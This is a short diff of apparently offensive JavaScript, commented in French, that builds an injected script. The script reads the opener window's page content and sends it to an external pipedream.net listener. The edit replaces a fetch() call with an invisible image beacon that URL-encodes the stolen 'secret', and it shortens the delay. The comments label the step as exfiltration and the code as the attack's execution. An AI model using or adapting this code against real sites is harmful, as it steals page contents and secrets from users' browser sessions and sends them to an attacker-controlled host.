@@ -43,13 +43,15 @@
                     "var encodedSecret = window.opener.document.body.innerHTML;" +
                     
                     // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
-                    "fetch('https://eotoci65n24zl7e.m.pipedream.net/?secret=' + encodedSecret);" +
+                    "var img = new Image();"+
+                    "img.src = 'https://eotoci65n24zl7e.m.pipedream.net/?secret=' + encodeURIComponent(encodedSecret);" +
+                    "document.body.appendChild(img);" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
                 "} else {" +
                     "console.error('Exfiltration Error: Section not found.');" +
                 "}" +
-            "}, 1500);</script>";
+            "}, 1000);</script>";
         
         // --- Exécution de l'attaque ---
 
